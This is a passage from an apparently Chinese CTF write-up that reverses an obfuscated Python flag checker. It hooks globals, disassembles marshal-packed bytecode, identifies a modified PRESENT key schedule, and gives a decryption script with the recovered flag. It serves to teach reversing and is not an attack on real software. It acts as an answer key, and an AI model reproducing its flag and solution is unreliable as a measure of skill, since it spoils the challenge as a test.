alt="B68_Z___PC67M0HVVJ2_DA8.png"></p><p>说明是present算法<br>那我们怎么得到那几个关键变量的值呢？<br>这里跟着官方WP学习了一手全局hook的思想<br>![&#96;BEPIHG0_C8_CY_@7@6~1L1.png](<a href="https://s2.loli.net/2023/12/03/4wQCeFy9LIT2jms.png">https://s2.loli.net/2023/12/03/4wQCeFy9LIT2jms.png</a>)<br>但是实际用的时候会发现 在exec后用的话 程序会直接退出(调用了exit())<br><img src="https://s2.loli.net/2023/12/03/GPh2KRF5AdOcoBj.png" alt="O_DK_VOF3HP@PW0_O@RGN1Q.png"><br>而我们在exec执行前定义一个exit 相当于把系统的exit给覆盖掉 (利用全局特性 类似web get&#x2F;post修改全局变量)<br>但是这样运行还是报错 我们再加个try except块来保证能得到globals()<br><img src="https://s2.loli.net/2023/12/03/6zMsQ3kjYfnLX52.png" alt="HY65JZD_HH__3_U6_X1YF@L.png"></p><p>可以看到这时已经能得到一些关键值了<br>总结一下 : 现在得到了</p><ul><li>sbox</li><li>sbox_inv</li><li>pbox</li><li>pbox_inv</li><li>cmps</li></ul><p>发现这里还少了 key的值<br>说明key不在globals里 这里再次利用全局hook的技巧<br>key在<code>generateRoundkeys80</code>中被调用</p><p><img src="https://s2.loli.net/2023/12/03/1iHt5M7uEXzVw4A.png" alt="img"></p><p>所以我们修改generateRoundkeys80 使它输出传入的两个变量的值即可(使用lambda <del>python高级特征学到了</del>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generateRoundkeys80 = <span class="keyword">lambda</span> x1,x2: <span class="built_in">print</span>(x1,x2)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/12/03/lEFAxXu9cnajroK.png" alt="_G0380___9__SM1E_1O~LD0.png"><br>这就得到了key!<br>但是直接套会发现解出来不对…<br>那就只能看字节码 手动脱marshal(5,6次吧)<br>得到关键的generatekey80的字节码(最后一层才脱出来 说明关键应该在这里)</p><details><summary>点击查看代码</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line">  2           0 LOAD_CONST               0 (&lt;code object generateRoundkeys80 at 0x7fb5577493a0, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;generateRoundkeys80&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (generateRoundkeys80)</span><br><span class="line"></span><br><span class="line"> 11           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">             12 LOAD_CONST                 2           0 LOAD_CONST               0 (&lt;code object encrypt at 0x7f7a22c7c660, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;encrypt&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (encrypt)</span><br><span class="line"></span><br><span class="line"> 16           8 LOAD_NAME                1 (input)</span><br><span class="line">             10 LOAD_CONST               2 (&#x27;pls input ur flag:&#x27;)</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             14 STORE_NAME               2 (inp)</span><br><span class="line"></span><br><span class="line"> 17          16 LOAD_NAME                3 (len)</span><br><span class="line">             18 LOAD_NAME                2 (inp)</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 LOAD_CONST               3 (32)</span><br><span class="line">             24 COMPARE_OP               3 (!=)</span><br><span class="line">             26 POP_JUMP_IF_FALSE       44</span><br><span class="line"></span><br><span class="line"> 18          28 LOAD_NAME                4 (print)</span><br><span class="line">             30 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">             32 CALL_FUNCTION            1</span><br><span class="line">             34 POP_TOP</span><br><span class="line"></span><br><span class="line"> 19          36 LOAD_NAME                5 (exit)</span><br><span class="line">             38 LOAD_CONST               5 (0)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 POP_TOP</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;   44 LOAD_NAME                2 (inp)</span><br><span class="line">             46 LOAD_CONST               6 (None)</span><br><span class="line">             48 LOAD_CONST               7 (8)</span><br><span class="line">             50 BUILD_SLICE              2</span><br><span class="line">             52 BINARY_SUBSCR</span><br><span class="line">             54 LOAD_NAME                2 (inp)</span><br><span class="line">             56 LOAD_CONST               7 (8)</span><br><span class="line">             58 LOAD_CONST               8 (16)</span><br><span class="line">             60 BUILD_SLICE              2</span><br><span class="line">             62 BINARY_SUBSCR</span><br><span class="line">             64 LOAD_NAME                2 (inp)</span><br><span class="line">             66 LOAD_CONST               8 (16)</span><br><span class="line">             68 LOAD_CONST               9 (24)</span><br><span class="line">             70 BUILD_SLICE              2</span><br><span class="line">             72 BINARY_SUBSCR</span><br><span class="line">             74 LOAD_NAME                2 (inp)</span><br><span class="line">             76 LOAD_CONST               9 (24)</span><br><span class="line">             78 LOAD_CONST               3 (32)</span><br><span class="line">             80 BUILD_SLICE              2</span><br><span class="line">             82 BINARY_SUBSCR</span><br><span class="line">             84 BUILD_LIST               4</span><br><span class="line">             86 STORE_NAME               6 (blocks)</span><br><span class="line"></span><br><span class="line"> 21          88 LOAD_CONST              10 (120617461261311902)</span><br><span class="line">             90 LOAD_CONST              11 (16357837616839286114)</span><br><span class="line">             92 LOAD_CONST              12 (312508749794633008)</span><br><span class="line">             94 LOAD_CONST              13 (1843701600916795272)</span><br><span class="line">             96 BUILD_LIST               4</span><br><span class="line">             98 STORE_NAME               7 (cmps)</span><br><span class="line"></span><br><span class="line"> 22         100 LOAD_NAME                0 (encrypt)</span><br><span class="line">            102 LOAD_NAME                6 (blocks)</span><br><span class="line">            104 CALL_FUNCTION            1</span><br><span class="line">            106 STORE_NAME               8 (out_blocks)</span><br><span class="line"></span><br><span class="line"> 23         108 LOAD_NAME                9 (range)</span><br><span class="line">            110 LOAD_CONST              14 (4)</span><br><span class="line">            112 CALL_FUNCTION            1</span><br><span class="line">            114 GET_ITER</span><br><span class="line">        &gt;&gt;  116 FOR_ITER                36 (to 154)</span><br><span class="line">            118 STORE_NAME              10 (i)</span><br><span class="line"></span><br><span class="line"> 24         120 LOAD_NAME                7 (cmps)</span><br><span class="line">            122 LOAD_NAME               10 (i)</span><br><span class="line">            124 BINARY_SUBSCR</span><br><span class="line">            126 LOAD_NAME                8 (out_blocks)</span><br><span class="line">            128 LOAD_NAME               10 (i)</span><br><span class="line">            130 BINARY_SUBSCR</span><br><span class="line">            132 COMPARE_OP               3 (!=)</span><br><span class="line">            134 POP_JUMP_IF_FALSE      116</span><br><span class="line"></span><br><span class="line"> 25         136 LOAD_NAME                4 (print)</span><br><span class="line">            138 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">            140 CALL_FUNCTION            1</span><br><span class="line">            142 POP_TOP</span><br><span class="line"></span><br><span class="line"> 26         144 LOAD_NAME                5 (exit)</span><br><span class="line">            146 LOAD_CONST               5 (0)</span><br><span class="line">            148 CALL_FUNCTION            1</span><br><span class="line">            150 POP_TOP</span><br><span class="line">            152 JUMP_ABSOLUTE          116</span><br><span class="line"></span><br><span class="line"> 27     &gt;&gt;  154 LOAD_NAME                4 (print)</span><br><span class="line">            156 LOAD_CONST              15 (&#x27;Correct!&#x27;)</span><br><span class="line">            158 CALL_FUNCTION            1</span><br><span class="line">            160 POP_TOP</span><br><span class="line">            162 LOAD_CONST               6 (None)</span><br><span class="line">            164 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object encrypt at 0x7f7a22c7c660, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (32)</span><br><span class="line">              2 STORE_FAST               1 (rounds)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (generateRoundkeys80)</span><br><span class="line">              6 LOAD_CONST               2 (85354531916197809168417)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 CALL_FUNCTION            2</span><br><span class="line">             12 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  5          14 BUILD_LIST               0</span><br><span class="line">             16 STORE_FAST               3 (out)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_FAST                0 (blocks)</span><br><span class="line">             20 GET_ITER</span><br><span class="line">        &gt;&gt;   22 FOR_ITER                84 (to 108)</span><br><span class="line">             24 STORE_FAST               4 (block)</span><br><span class="line"></span><br><span class="line">  7          26 LOAD_GLOBAL              1 (string2number)</span><br><span class="line">             28 LOAD_FAST                4 (block)</span><br><span class="line">             30 CALL_FUNCTION            1</span><br><span class="line">             32 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line">  8          34 LOAD_GLOBAL              2 (range)</span><br><span class="line">             36 LOAD_FAST                1 (rounds)</span><br><span class="line">             38 LOAD_CONST               3 (1)</span><br><span class="line">             40 BINARY_SUBTRACT</span><br><span class="line">             42 CALL_FUNCTION            1</span><br><span class="line">             44 GET_ITER</span><br><span class="line">        &gt;&gt;   46 FOR_ITER                34 (to 82)</span><br><span class="line">             48 STORE_FAST               6 (i)</span><br><span class="line"></span><br><span class="line">  9          50 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             52 LOAD_FAST                5 (state)</span><br><span class="line">             54 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             56 LOAD_FAST                6 (i)</span><br><span class="line">             58 BINARY_SUBSCR</span><br><span class="line">             60 CALL_FUNCTION            2</span><br><span class="line">             62 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 10          64 LOAD_GLOBAL              4 (sBoxLayer)</span><br><span class="line">             66 LOAD_FAST                5 (state)</span><br><span class="line">             68 CALL_FUNCTION            1</span><br><span class="line">             70 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 11          72 LOAD_GLOBAL              5 (pLayer)</span><br><span class="line">             74 LOAD_FAST                5 (state)</span><br><span class="line">             76 CALL_FUNCTION            1</span><br><span class="line">             78 STORE_FAST               5 (state)</span><br><span class="line">             80 JUMP_ABSOLUTE           46</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;   82 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             84 LOAD_FAST                5 (state)</span><br><span class="line">             86 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             88 LOAD_CONST               4 (-1)</span><br><span class="line">             90 BINARY_SUBSCR</span><br><span class="line">             92 CALL_FUNCTION            2</span><br><span class="line">             94 STORE_FAST               7 (cipher)</span><br><span class="line"></span><br><span class="line"> 13          96 LOAD_FAST                3 (out)</span><br><span class="line">             98 LOAD_METHOD              6 (append)</span><br><span class="line">            100 LOAD_FAST                7 (cipher)</span><br><span class="line">            102 CALL_METHOD              1</span><br><span class="line">            104 POP_TOP</span><br><span class="line">            106 JUMP_ABSOLUTE           22</span><br><span class="line"></span><br><span class="line"> 14     &gt;&gt;  108 LOAD_FAST                3 (out)</span><br><span class="line">            110 RETURN_VALUE</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line"> 12          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object generateRoundkeys80 at 0x7fb5577493a0, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               1 (1)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 LOAD_CONST               1 (1)</span><br><span class="line">             12 BINARY_ADD</span><br><span class="line">             14 LOAD_CONST               1 (1)</span><br><span class="line">             16 CALL_FUNCTION            3</span><br><span class="line">             18 GET_ITER</span><br><span class="line">        &gt;&gt;   20 FOR_ITER                90 (to 112)</span><br><span class="line">             22 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             26 LOAD_METHOD              1 (append)</span><br><span class="line">             28 LOAD_FAST                0 (key)</span><br><span class="line">             30 LOAD_CONST               2 (16)</span><br><span class="line">             32 BINARY_RSHIFT</span><br><span class="line">             34 CALL_METHOD              1</span><br><span class="line">             36 POP_TOP</span><br><span class="line"></span><br><span class="line">  6          38 LOAD_FAST                0 (key)</span><br><span class="line">             40 LOAD_CONST               3 (524287)</span><br><span class="line">             42 BINARY_AND</span><br><span class="line">             44 LOAD_CONST               4 (61)</span><br><span class="line">             46 BINARY_LSHIFT</span><br><span class="line">             48 LOAD_FAST                0 (key)</span><br><span class="line">             50 LOAD_CONST               5 (19)</span><br><span class="line">             52 BINARY_RSHIFT</span><br><span class="line">             54 BINARY_ADD</span><br><span class="line">             56 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  7          58 LOAD_GLOBAL              2 (Sbox)</span><br><span class="line">             60 LOAD_FAST                0 (key)</span><br><span class="line">             62 LOAD_CONST               6 (76)</span><br><span class="line">             64 BINARY_RSHIFT</span><br><span class="line">             66 BINARY_SUBSCR</span><br><span class="line">             68 LOAD_CONST               6 (76)</span><br><span class="line">             70 BINARY_LSHIFT</span><br><span class="line">             72 LOAD_FAST                0 (key)</span><br><span class="line">             74 LOAD_CONST               7 (2)</span><br><span class="line">             76 LOAD_CONST               6 (76)</span><br><span class="line">             78 BINARY_POWER</span><br><span class="line">             80 LOAD_CONST               1 (1)</span><br><span class="line">             82 BINARY_SUBTRACT</span><br><span class="line">             84 BINARY_AND</span><br><span class="line">             86 BINARY_ADD</span><br><span class="line">             88 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  8          90 LOAD_FAST                0 (key)</span><br><span class="line">             92 LOAD_FAST                3 (i)</span><br><span class="line">             94 LOAD_CONST               8 (15)</span><br><span class="line">             96 BINARY_LSHIFT</span><br><span class="line">             98 LOAD_FAST                0 (key)</span><br><span class="line">            100 LOAD_CONST               5 (19)</span><br><span class="line">            102 BINARY_RSHIFT</span><br><span class="line">            104 BINARY_XOR</span><br><span class="line">            106 INPLACE_XOR</span><br><span class="line">            108 STORE_FAST               0 (key)</span><br><span class="line">            110 JUMP_ABSOLUTE           20</span><br><span class="line"></span><br><span class="line">  9     &gt;&gt;  112 LOAD_FAST                2 (roundkeys)</span><br><span class="line">            114 RETURN_VALUE</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></details><p><img src="https://s2.loli.net/2023/12/03/IOML12SXx45RyFU.png" alt="img"></p><p>这里也能解释为什么前面全局hook后调用encrypt(xxx)<br>结合标准roundkeys生成算法<br><img src="https://s2.loli.net/2023/12/03/Rusgx94JzwmIdvU.png" alt="img"></p><p>再对比字节码(通过特征参数定位)<br><img src="https://s2.loli.net/2023/12/03/OEBXFZSzy8VUcGt.png" alt="img"><br>可以发现在 <code>key ^= i &lt;&lt; 15</code> 的基础上变成了<br><code>key ^= (i&lt;&lt;15) ^ (key &gt;&gt; 19)</code><br>所以在标准代码上稍作修改:(直接搬官方的了 应该是对着字节码写的吧 网上找的都不好直接改 <del>还不如自己手搓字节码</del>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            output += Sbox_inv[( state &gt;&gt; (i*<span class="number">4</span>)) &amp; <span class="number">0xF</span>] &lt;&lt; (i*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer_dec</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            output += ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key,rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,rounds+<span class="number">1</span>,<span class="number">1</span>): </span><br><span class="line">            roundkeys.append(key &gt;&gt;<span class="number">16</span>)</span><br><span class="line">            key = ((key &amp; (<span class="number">2</span>**<span class="number">19</span>-<span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">            key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>)+(key &amp; (<span class="number">2</span>**<span class="number">76</span>-<span class="number">1</span>))</span><br><span class="line">            key ^= (i &lt;&lt; <span class="number">15</span>)^(key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(i[c])&lt;&lt;(<span class="number">8</span>*c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#        0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f</span></span><br><span class="line">Sbox= [<span class="number">0xc</span>,<span class="number">0x5</span>,<span class="number">0x6</span>,<span class="number">0xb</span>,<span class="number">0x9</span>,<span class="number">0x0</span>,<span class="number">0xa</span>,<span class="number">0xd</span>,<span class="number">0x3</span>,<span class="number">0xe</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x4</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x2</span>]</span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">PBox = [<span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,</span><br><span class="line">        <span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,</span><br><span class="line">        <span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,</span><br><span class="line">        <span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span>]</span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state,roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">blocks</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = block</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds-<span class="number">1</span>):</span><br><span class="line">                state = addRoundKey(state, roundkeys[-i-<span class="number">1</span>])</span><br><span class="line">                state = pLayer_dec(state)</span><br><span class="line">                state = sBoxLayer_dec(state)</span><br><span class="line">        decipher = addRoundKey(state, roundkeys[<span class="number">0</span>])</span><br><span class="line">        flag += <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(decipher&gt;&gt;(c*<span class="number">8</span>) &amp; <span class="number">0xff</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line">decrypt(cmps)</span><br><span class="line"><span class="comment"># 83ab766012aef9934c95ed93e9822a91</span></span><br></pre></td></tr></table></figure><p>想了想还是自己手搓一下(练习下字节码) 把加密代码写了下:<br>还复习了几个点:</p><ul><li>INPLACE_ADD: output +&#x3D;</li><li>BINARY_SUBSCR 用来划分块 避免字节码产生歧义</li></ul><p>自己写的时候 发现string2number直接看字节码是不太能写出来的 但知道原理自己写一下也差不了多少</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 